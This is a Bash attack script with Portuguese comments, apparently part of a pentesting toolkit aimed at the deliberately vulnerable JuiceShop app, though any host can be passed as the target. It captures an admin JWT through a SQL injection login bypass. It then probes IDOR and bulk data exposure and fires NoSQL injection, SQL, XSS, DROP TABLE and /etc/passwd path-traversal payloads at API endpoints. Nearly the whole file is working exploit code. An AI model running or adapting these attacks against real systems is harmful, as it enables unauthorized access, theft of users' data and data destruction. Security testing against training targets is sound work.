#!/bin/bash
# ==============================================================================
# Ruadan — Fuzzing API Autenticado (IDOR + NoSQL injection + info disclosure)
# ==============================================================================
# Uso: api_fuzz.sh <target> <port> <scheme>
#
# POR QUE: endpoints de API são o ALVO REAL de aplicações como JuiceShop.
# Este script usa o JWT admin (capturado via SQLi) para:
#   1. Enumerar TODOS os recursos com autenticação
#   2. Testar IDOR (trocar userId/sessionId para acessar dados de outros)
#   3. Testar NoSQL injection em POST bodies ({"$gt":""}, {"$ne":""})
#   4. Testar JSON injection em POST bodies
#   5. Detectar information disclosure em responses de admin
# Emite: API_VULN_FOUND: <tipo> <endpoint> <evidencia>
# ==============================================================================
set -u

TARGET="${1:?uso: api_fuzz.sh <target> <port> <scheme>}"
PORT="${2:-80}"
SCHEME="${3:-http}"
CURL_OPTS="-sk --max-time 15"

BASE_URL="${SCHEME}://${TARGET}:${PORT}"
if [ "$SCHEME" = "http" ]; then
    _redir=$(curl $CURL_OPTS -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
    if [ -n "$_redir" ] && [[ "$_redir" == https* ]]; then
        BASE_URL="${_redir%/}"
    fi
fi
echo "[api-fuzz] Alvo: ${BASE_URL}"

# ---- 1. Captura JWT via SQLi bypass -------------------------------------------
LOGIN_BODY='{"email":"'"'"' OR 1=1--","password":"x"}'
LOGIN_RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" -H "Content-Type: application/json" -d "$LOGIN_BODY" 2>/dev/null)
JWT=$(echo "$LOGIN_RESP" | grep -oE '"token":"[^"]+"' | sed 's/"token":"//;s/"$//' | head -1)
if [ -z "$JWT" ]; then
    echo "[api-fuzz] Sem JWT — fuzzing autenticado impossível."
    exit 0
fi
echo "[api-fuzz] JWT admin capturado (${#JWT} chars)"

AUTH="Authorization: Bearer ${JWT}"

# ---- 2. Endpoints para testar ------------------------------------------------
# Combinados: descobertos pelo api_route_extract + conhecidos do JuiceShop
declare -a ENDPOINTS=(
    "/rest/user/whoami"
    "/rest/user/1"
    "/rest/user/2"
    "/rest/products"
    "/rest/products/search?q="
    "/rest/basket/1"
    "/rest/basket/2"
    "/rest/save/review"
    "/rest/order/1"
    "/rest/order/2"
    "/api/Users"
    "/api/Orders"
    "/api/Quantitys"
    "/api/Products"
    "/api/Deliverys"
    "/api/Recycles"
    "/api/SecurityQuestions"
    "/api/Complaints"
    "/api/Feedbacks"
    "/api/Cards"
    "/api/Addresss"
    "/metrics"
)

echo "[api-fuzz] Testando ${#ENDPOINTS[@]} endpoints com autenticação..."

# ---- 3. IDOR: trocar ID de usuário --------------------------------------------
VULN_COUNT=0
for EP in "${ENDPOINTS[@]}"; do
    # GET com JWT admin (acesso permitido)
    RESP_AUTH=$(curl $CURL_OPTS -H "$AUTH" "${BASE_URL}${EP}" 2>/dev/null)
    CODE_AUTH=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
    SIZE_AUTH=${#RESP_AUTH}

    if [ "$CODE_AUTH" = "200" ] && [ "$SIZE_AUTH" -gt 50 ]; then
        echo "API_ENDPOINT_FOUND: GET ${EP} (auth:${CODE_AUTH}/${SIZE_AUTH}B) — acessível com JWT"

        # IDOR: trocar /1 por /2, /3 (dados de outros usuários)
        if echo "$EP" | grep -qE '/(user|basket|order|card|address)/\d+'; then
            OTHER_ID=$(echo "$EP" | sed 's/\/[0-9]*$/\/3/')
            RESP_OTHER=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{http_code}" "${BASE_URL}${OTHER_ID}" 2>/dev/null)
            if [ "$RESP_OTHER" = "200" ]; then
                echo "API_VULN_FOUND: IDOR ${OTHER_ID} — acessível com JWT de outro usuário (HTTP ${RESP_OTHER})"
                VULN_COUNT=$((VULN_COUNT+1))
            fi
        fi

        # IDOR em listas: /api/Orders sem filtro
        if echo "$EP" | grep -qE '^/api/(Users|Orders|Cards|Addresss|Complaints|Feedbacks)$'; then
            N_ITEMS=$(echo "$RESP_AUTH" | grep -oE '"id"' | wc -l)
            if [ "$N_ITEMS" -gt 1 ]; then
                echo "API_VULN_FOUND: INFO_DISCLOSURE ${EP} — ${N_ITEMS} registros expostos com JWT (sem filtro de ownership)"
                VULN_COUNT=$((VULN_COUNT+1))
            fi
        fi
    fi
done

# ---- 4. NoSQL Injection em POST bodies ----------------------------------------
NOSQL_PAYLOADS=(
    '{"email":{"$gt":""},"password":{"$gt":""}}'
    '{"email":{"$ne":"invalid"},"password":{"$ne":"invalid"}}'
    '{"email":"admin@juice-sh.op","password":{"$regex":".*"}}'
    '{"email":{"$regex":"^a"},"password":{"$regex":".*"}}'
)

echo "[api-fuzz] Testando NoSQL injection em POST /rest/user/login..."
for PAYLOAD in "${NOSQL_PAYLOADS[@]}"; do
    RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" \
        -H "Content-Type: application/json" -H "$AUTH" -d "$PAYLOAD" 2>/dev/null)
    CODE=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" \
        -H "Content-Type: application/json" -H "$AUTH" -d "$PAYLOAD" -o /dev/null -w "%{http_code}" 2>/dev/null)
    if [ "$CODE" = "200" ] && echo "$RESP" | grep -q "token"; then
        echo "API_VULN_FOUND: NOSQL_INJECTION /rest/user/login — payload: ${PAYLOAD:0:50}... (HTTP ${CODE} + token)"
        VULN_COUNT=$((VULN_COUNT+1))
    fi
done

# ---- 5. Search injection --------------------------------------------------------
echo "[api-fuzz] Testando injeção em /rest/products/search?q=..."
for INJ in "'; DROP TABLE Users; --" "<script>alert(1)</script>" "' OR '1'='1" "../../etc/passwd"; do
    INJ_ENCODED=$(echo "$INJ" | sed 's/ /%20/g; s/"/%22/g; s//%27/g; s/</%3C/g; s/>/%3E/g; s/;/%3B/g')
    RESP=$(curl $CURL_OPTS "${BASE_URL}/rest/products/search?q=${INJ_ENCODED}" 2>/dev/null)
    CODE=$(curl $CURL_OPTS "${BASE_URL}/rest/products/search?q=${INJ_ENCODED}" -o /dev/null -w "%{http_code}" 2>/dev/null)
    if [ "$CODE" = "200" ] && [ ${#RESP} -gt 100 ]; then
        # Verifica se a resposta contém dados que não deveriam estar lá
        if echo "$RESP" | grep -qi "error\|sql\|passwd\|root:"; then
            echo "API_VULN_FOUND: SEARCH_INJECTION /rest/products/search?q= — payload: ${INJ:0:30}... (HTTP ${CODE})"
            VULN_COUNT=$((VULN_COUNT+1))
        fi
    fi
done

# ---- 6. POST body injection em endpoints ---------------------------------------
echo "[api-fuzz] Testando POST body injection..."
for EP in "/rest/save/review" "/rest/basket/1/product" "/api/Feedbacks"; do
    for INJ in '{"message":"<script>alert(1)</script>"}' '{"message":{"$gt":""}}' '{"comment":"SELECT * FROM Users"}'; do
        RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" \
            -H "Content-Type: application/json" -H "$AUTH" -d "$INJ" 2>/dev/null)
        CODE=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" \
            -H "Content-Type: application/json" -H "$AUTH" -d "$INJ" -o /dev/null -w "%{http_code}" 2>/dev/null)
        if [ "$CODE" = "200" ] || [ "$CODE" = "201" ]; then
            # Se aceitou payload sem sanitizar
            if echo "$RESP" | grep -qi "script\|SELECT\|error"; then
                echo "API_VULN_FOUND: POST_INJECTION ${EP} — payload aceito sem sanitização (HTTP ${CODE})"
                VULN_COUNT=$((VULN_COUNT+1))
                break
            fi
        fi
    done
done

# ---- 7. Path traversal no /ftp ---------------------------------------------------
echo "[api-fuzz] Testando path traversal em /ftp..."
TRAV_PAYLOADS=(
    "/ftp/…%2F…%2F…%2F…%2Fetc%2Fpasswd"
    "/ftp/..%2F..%2F..%2Fetc%2Fpasswd"
    "/ftp/%2e%2e%2fetc%2fpasswd"
    "/ftp/legal.md?md_debug=.md"
)
for p in "${TRAV_PAYLOADS[@]}"; do
    RESP=$(curl $CURL_OPTS "${BASE_URL}${p}" 2>/dev/null)
    CODE=$(curl $CURL_OPTS "${BASE_URL}${p}" -o /dev/null -w "%{http_code}" 2>/dev/null)
    if [ "$CODE" = "200" ] && echo "$RESP" | grep -q "root:"; then
        echo "API_VULN_FOUND: PATH_TRAVERSAL ${p:0:50} — /etc/passwd lido do servidor (HTTP ${CODE})"
        VULN_COUNT=$((VULN_COUNT+1))
        break
    elif [ "$CODE" = "200" ] && [ ${#RESP} -gt 50 ]; then
        echo "API_VULN_FOUND: FILE_READ ${p:0:50} — arquivo lido: ${#RESP}B (HTTP ${CODE})"
        VULN_COUNT=$((VULN_COUNT+1))
        break
    fi
done

echo "[api-fuzz] Vulnerabilidades encontradas: ${VULN_COUNT}"
exit 0
